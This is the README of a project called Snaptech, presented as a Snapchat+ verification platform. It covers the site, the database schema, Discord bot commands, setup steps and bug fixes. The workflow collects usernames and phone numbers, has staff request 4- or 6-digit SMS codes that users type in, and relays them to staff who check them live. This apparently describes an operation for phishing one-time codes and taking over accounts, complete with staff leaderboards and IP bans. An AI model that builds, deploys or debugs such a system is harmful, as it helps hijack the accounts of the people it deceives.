# 📱 Snaptech — Snapchat+ Verification Platform

A full-stack platform that collects Snapchat+ subscription verification requests, routes them to Discord staff via rich embeds, and provides a real-time admin panel.

```
User fills form → Vercel API → NeonDB → Discord Bot → Staff validates → User redirected
```

---

## 📋 Table of Contents

- [Architecture](#-architecture)
- [Project Structure](#-project-structure)
- [Workflow](#-workflow)
- [Setup — Vercel Site](#-setup--vercel-site)
- [Setup — Discord Bot](#-setup--discord-bot)
- [Environment Variables](#-environment-variables)
- [Discord Commands](#-discord-commands)
- [Discord Button Flow](#-discord-button-flow)
- [Database Schema](#-database-schema)
- [Status Reference](#-status-reference)
- [Bug Fixes (v2.1)](#-bug-fixes-v21)
- [Troubleshooting](#-troubleshooting)

---

## 🏗 Architecture

```
┌──────────────────────────────────────────────────────────┐
│                        USER                              │
│   index.html → fills form → code.html → enters code     │
└─────────────────────────┬────────────────────────────────┘
                          │  HTTP POST
                          ▼
┌──────────────────────────────────────────────────────────┐
│                   VERCEL (Serverless)                    │
│                                                          │
│  /api/snapchat.js      — register request                │
│  /api/verify-code.js   — submit SMS code                 │
│  /api/status.js        — poll request status             │
│  /api/staff-action.js  — bot → DB actions                │
│  /api/ban-ip.js        — bot → ban IP                    │
│  /api/admin-data.js    — admin panel data                │
│  /api/middleware.js    — IP ban check                    │
└─────────────────────────┬────────────────────────────────┘
                          │  SQL (Neon serverless)
                          ▼
┌──────────────────────────────────────────────────────────┐
│                   NEON POSTGRESQL                        │
│                                                          │
│  snap_requests  — main request table                     │
│  banned_ips     — banned IP addresses                    │
│  snap_logs      — staff action audit log                 │
│  snap_stats     — daily aggregated statistics            │
└──────────────────┬───────────────────────────────────────┘
                   │  Poll every 5s
                   ▼
┌──────────────────────────────────────────────────────────┐
│                  DISCORD BOT (Node.js)                   │
│                                                          │
│  polling.js     — detects new/retry code submissions     │
│  buttons.js     — handles all button interactions        │
│  slash.js       — /stats, /leaderboard, /banip, etc.    │
│  api.js         — typed fetch wrapper (8s timeout)       │
└──────────────────────────────────────────────────────────┘
```

---

## 📁 Project Structure

```
site_suro/
├── index.html                  # Landing / form page
├── code.html                   # Code entry page
├── banned.html                 # Banned IP page
├── code.js                     # Frontend logic (polling + form)
│
├── api/                        # Vercel serverless functions
│   ├── snapchat.js             # POST — register a new request
│   ├── verify-code.js          # POST — user submits SMS code
│   ├── status.js               # GET  — poll request status
│   ├── staff-action.js         # POST — staff actions (claim, validate…)
│   ├── ban-ip.js               # POST — ban an IP address
│   ├── admin-ban.js            # POST — admin panel ban (PIN-protected)
│   ├── admin-data.js           # GET  — admin panel data (PIN-protected)
│   ├── stats.js                # GET  — public stats endpoint
│   └── middleware.js           # IP resolution + ban check
│
├── neon.sql                    # Full DB schema (run once on new DB)
├── fix-db-v3.sql               # Migration script (existing DB)
├── .env.local.example          # Site environment variables template
│
└── bot/                        # Discord bot (standalone Node.js)
    ├── bot.js                  # Entry point
    ├── package.json
    ├── Dockerfile
    ├── .env.example            # Bot environment variables template
    └── src/
        ├── config.js           # ENV loading + validation
        ├── commands.js         # Slash command definitions
        ├── database.js         # All SQL queries
        ├── polling.js          # DB polling → Discord embeds
        ├── handlers/
        │   ├── buttons.js      # Button interaction handler
        │   └── slash.js        # Slash command handler
        └── utils/
            ├── api.js          # Centralized fetch wrapper (timeout, errors)
            ├── colors.js       # Operator → embed color mapping
            ├── embedBuilder.js # All Discord embed constructors
            └── formatters.js   # Phone, IP, date formatters
```

---

## 🔄 Workflow

```
1. USER   fills form (username, phone, operator, country)
          └─► POST /api/snapchat.js → INSERT snap_requests (status: pending)

2. BOT    polls DB every 5s for status='pending'
          └─► Sends embed to Discord with [📋 Claim] button

3. STAFF  clicks [📋 Claim]
          └─► POST /api/staff-action claim (WHERE status='pending' → atomic)
          └─► Embed updated: [🔢 4 digits] [🔢 6 digits] [❌ Wrong] [↩️ Unclaim]

4. STAFF  clicks [🔢 4 digits] or [🔢 6 digits]
          └─► POST /api/staff-action set_length (sends length=4 or length=6)
          └─► DB: status → waiting_code, code_length = 4|6

5. USER   sees code input (polled via GET /api/status.js)
          └─► Enters SMS code → POST /api/verify-code.js
          └─► DB: status → code_submitted, staff_code = "123456"

6. BOT    polls DB every 5s for status='code_submitted' AND updated_at > lastCheck
          └─► Sends new embed with [✅ True Code] [❌ False Code]

7a. STAFF clicks [✅ True Code]
          └─► POST /api/staff-action true_code
          └─► DB: status → completed → user redirected to success page

7b. STAFF clicks [❌ False Code]
          └─► POST /api/staff-action false_code
          └─► DB: status → retry_code → user prompted to re-enter code
          └─► BOT sends a fresh retry embed in Discord (with new True/False buttons)

8.  STAFF clicks [🚫 Ban IP] (any stage)
          └─► POST /api/ban-ip → INSERT banned_ips
```

---

## ⚙️ Setup — Vercel Site

### 1. Fork / clone the repo

```bash
git clone https://github.com/robalex01/site_suro.git
cd site_suro
```

### 2. Deploy to Vercel

```bash
npm i -g vercel
vercel
```

### 3. Set environment variables in Vercel dashboard

Go to **Project → Settings → Environment Variables** and add:

| Variable           | Required | Description                              |
|--------------------|----------|------------------------------------------|
| `DATABASE_URL`     | ✅        | Neon PostgreSQL connection string         |
| `STAFF_SECRET`     | ✅        | Shared secret with the bot               |
| `STAFF_PIN`        | ✅        | 6-digit PIN for the admin panel          |
| `DISCORD_WEBHOOK_URL` | ⬜    | Optional — direct webhook (bot preferred)|

### 4. Initialize the database

Run `neon.sql` in the [Neon SQL editor](https://console.neon.tech) — this creates all tables, indexes, and triggers.

If you already have an existing DB, run `fix-db-v3.sql` instead (migration script).

---

## 🤖 Setup — Discord Bot

### Prerequisites

- Node.js 18+
- A Discord application with a bot token ([discord.com/developers](https://discord.com/developers))
- Bot permissions: `Send Messages`, `Embed Links`, `Read Message History`
- Enable **Message Content Intent** in the Discord developer portal

### 1. Install dependencies

```bash
cd bot
npm install
```

### 2. Configure environment

```bash
cp .env.example .env
# Edit .env with your values
```

### 3. Run

```bash
# Development (auto-restart on file change)
npm run dev

# Production
npm start

# Docker
docker build -t snaptech-bot .
docker run --env-file .env snaptech-bot
```

### 4. Set the log channel

In Discord, run:
```
/config channel:#your-channel
```

---

## 🔑 Environment Variables

### Site (`.env.local` / Vercel)

| Variable              | Required | Description                                     |
|-----------------------|----------|-------------------------------------------------|
| `DATABASE_URL`        | ✅        | `postgres://...@ep-xxx.neon.tech/db?sslmode=require` |
| `STAFF_SECRET`        | ✅        | Shared secret — must match bot's `STAFF_SECRET` |
| `STAFF_PIN`           | ✅        | Admin panel PIN (6 digits recommended)          |
| `DISCORD_WEBHOOK_URL` | ⬜        | Optional backup webhook (bot handles this)      |

### Bot (`.env`)

| Variable                  | Required | Description                                          |
|---------------------------|----------|------------------------------------------------------|
| `DISCORD_BOT_TOKEN`       | ✅        | Bot token from Discord developer portal              |
| `DISCORD_CLIENT_ID`       | ✅        | Application client ID                                |
| `DATABASE_URL`            | ✅        | Same Neon connection string as the site              |
| `STAFF_SECRET`            | ✅        | Same secret as the site's `STAFF_SECRET`             |
| `DISCORD_GUILD_ID`        | ⭐        | Guild ID — commands deploy instantly (vs 1h global)  |
| `DISCORD_LOG_CHANNEL_ID`  | ⭐        | Channel for embeds — can be set via `/config`        |
| `API_BASE`                | ⬜        | Vercel URL (default: `https://snaptech.vercel.app`)  |

---

## 💬 Discord Commands

| Command          | Description                              | Options                     |
|------------------|------------------------------------------|-----------------------------|
| `/config`        | Set the log channel                      | `channel` (required)        |
| `/panel`         | Show the staff panel embed               | —                           |
| `/claim`         | Manually claim a request by phone        | `phone` (required)          |
| `/setlength`     | Set code length for a request            | `phone`, `length` (4 or 6)  |
| `/wrongnumber`   | Mark a number as wrong                   | `phone` (required)          |
| `/banip`         | Ban an IP address                        | `ip` (required)             |
| `/stats`         | Show global platform statistics          | —                           |
| `/today`         | Show today's statistics                  | —                           |
| `/operators`     | Show requests by mobile operator         | —                           |
| `/activity`      | Show hourly activity chart (last 24h)    | `hours` (optional)          |
| `/leaderboard`   | Show staff validation leaderboard        | `limit` (optional, default 10) |
| `/staffactivity` | Show detailed action counts per staff    | —                           |

---

## 🎛 Discord Button Flow

### New Request Embed
```
┌─────────────────────────────────────┐
│ 📱 New Snapchat+ Request            │
│  👤 Username   📞 Phone   📡 Op     │
│  🌍 Country    🏙️ City   🌐 IP      │
│  ⏰ Date                            │
├─────────────────────────────────────┤
│ [📋 Claim]  [🚫 Ban IP]            │
└─────────────────────────────────────┘
```

### After Claim
```
┌─────────────────────────────────────┐
│ 📋 Request In Progress              │
│  👤 Claimed by @staff               │
├─────────────────────────────────────┤
│ [🔢 4 digits] [🔢 6 digits]        │
│ [❌ Wrong Number] [↩️ Unclaim]      │
│ [🚫 Ban IP]  (if IP valid)         │
└─────────────────────────────────────┘
```

### Code Submitted Embed
```
┌─────────────────────────────────────┐
│ 🔓 Code Submitted by User           │
│  🔢 Code: 123456  (6-digit)        │
├─────────────────────────────────────┤
│ [✅ True Code]  [❌ False Code]     │
│ [🚫 Ban IP]  (if IP valid)         │
└─────────────────────────────────────┘
```

### After False Code — Retry Embed
```
┌─────────────────────────────────────┐
│ 🔄 User Redirected — New Code Needed│
│  Previous code was incorrect.        │
├─────────────────────────────────────┤
│ [✅ True Code]  [❌ False Code]     │
│ [🚫 Ban IP]  (if IP valid)         │
└─────────────────────────────────────┘
```

---

## 🗄 Database Schema

### `snap_requests`

| Column        | Type           | Description                          |
|---------------|----------------|--------------------------------------|
| `id`          | SERIAL         | Primary key                          |
| `username`    | VARCHAR(100)   | Snapchat username (unique)           |
| `phone`       | VARCHAR(20)    | Phone number (unique)                |
| `location`    | VARCHAR(50)    | `france` or `belgique`               |
| `operator`    | VARCHAR(50)    | Mobile operator key                  |
| `lang`        | VARCHAR(10)    | Language (`fr`)                      |
| `status`      | VARCHAR(30)    | See status reference below           |
| `ip_address`  | VARCHAR(45)    | Client IP                            |
| `country`     | VARCHAR(50)    | `France` or `Belgium`                |
| `city`        | VARCHAR(100)   | City (currently always `Unknown`)    |
| `code_length` | INTEGER        | 4 or 6 (set by staff)               |
| `staff_code`  | VARCHAR(6)     | SMS code entered by user             |
| `created_at`  | TIMESTAMP      | Insert timestamp                     |
| `updated_at`  | TIMESTAMP      | Auto-updated on every UPDATE         |

### `banned_ips`

| Column       | Type         | Description              |
|--------------|--------------|--------------------------|
| `id`         | SERIAL       | Primary key              |
| `ip_address` | VARCHAR(45)  | Banned IP (unique)       |
| `reason`     | VARCHAR(255) | Optional reason          |
| `banned_by`  | VARCHAR(100) | Staff Discord tag        |
| `created_at` | TIMESTAMP    | Ban timestamp            |

### `snap_logs`

| Column       | Type      | Description                          |
|--------------|-----------|--------------------------------------|
| `id`         | SERIAL    | Primary key                          |
| `request_id` | INTEGER   | FK to snap_requests                  |
| `action`     | VARCHAR   | `claim`, `true_code`, `false_code`…  |
| `details`    | JSONB     | `{ phone, staff_tag }`               |
| `created_at` | TIMESTAMP | Log timestamp                        |

---

## 📊 Status Reference

| Status           | Description                                      | Next status(es)                   |
|------------------|--------------------------------------------------|-----------------------------------|
| `pending`        | Just registered, waiting for staff               | `processing`, `wrong_number`      |
| `processing`     | Claimed by a staff member                        | `waiting_code`, `wrong_number`    |
| `waiting_code`   | Code length set, user can enter their SMS code   | `code_submitted`                  |
| `code_submitted` | User submitted a code, awaiting staff validation | `completed`, `retry_code`         |
| `completed`      | ✅ Code validated, user redirected to success    | —                                 |
| `wrong_number`   | ❌ Phone number was wrong                        | —                                 |
| `retry_code`     | ❌ Code refused, user must re-enter              | `code_submitted` (on re-submit)   |

---

## 🐛 Bug Fixes (v2.1)

This release fixes **8 bugs** present in the original codebase:

| # | Severity | Bug | Fix |
|---|----------|-----|-----|
| 1 | 🔴 Critical | `len4`/`len6` buttons never sent `length` to the API → always failed with "Invalid length" | Added `length` param to `callStaffAction()` in `buttons.js` |
| 2 | 🔴 Critical | `sendRetryEmbed()` called in `falsecode` handler but never defined → `ReferenceError` crash | Implemented `sendRetryEmbed()` in `buttons.js` |
| 3 | 🔴 Critical | Retry polling used ID-based tracking → re-submitted code on same row was never detected by the bot | Polling now uses `updated_at` timestamp; DB trigger auto-updates it on every status change |
| 4 | 🟠 Major | Unclaim removed all buttons → staff couldn't reclaim from same embed | Unclaim now restores the `[📋 Claim]` button |
| 5 | 🟠 Major | Double-claim race condition → two staff could claim simultaneously | API uses `WHERE status='pending' RETURNING id` — if row already claimed, returns 409 |
| 6 | 🟠 Major | `verify-code.js` rejected submissions in `retry_code` status → user blocked | Endpoint now accepts `waiting_code` and `retry_code` statuses |
| 7 | 🟡 Minor | No timeout on fetch calls → hanging interactions if API is slow/down | All API calls go through `utils/api.js` with 8-second `AbortSignal` timeout |
| 8 | 🟡 Minor | `unclaim` action was not logged in `snap_logs` | Unclaim now inserts a log entry |

---

## 🛠 Troubleshooting

### Bot doesn't post embeds
- Check `DISCORD_LOG_CHANNEL_ID` is set (or run `/config channel:#your-channel`)
- Ensure the bot has `Send Messages` + `Embed Links` in that channel
- Check logs for `⚠️  Log channel not found`

### Slash commands don't appear
- Set `DISCORD_GUILD_ID` for instant deployment (global takes up to 1 hour)
- Ensure `DISCORD_CLIENT_ID` is correct
- Bot must be invited with the `applications.commands` OAuth2 scope

### "Invalid length" error on 4/6 digit buttons *(was Bug #1)*
- Ensure you're running the patched `bot/src/handlers/buttons.js` (v2.1+)

### Code re-submission not detected after false code *(was Bug #3)*
- Ensure you're running the patched `bot/src/polling.js` (v2.1+)
- Confirm the `updated_at` column and trigger exist (run `neon.sql` if not)

### API errors (`401 Unauthorized`)
- `STAFF_SECRET` in `.env` (bot) must exactly match `STAFF_SECRET` in Vercel env
- No trailing spaces or quotes around the value

### Bot crashes on start
- Check all **required** env variables are set: `DISCORD_BOT_TOKEN`, `DISCORD_CLIENT_ID`, `DATABASE_URL`, `STAFF_SECRET`
- Verify `DATABASE_URL` format: `postgres://...?sslmode=require`

---

## 📄 License

Private project — all rights reserved.
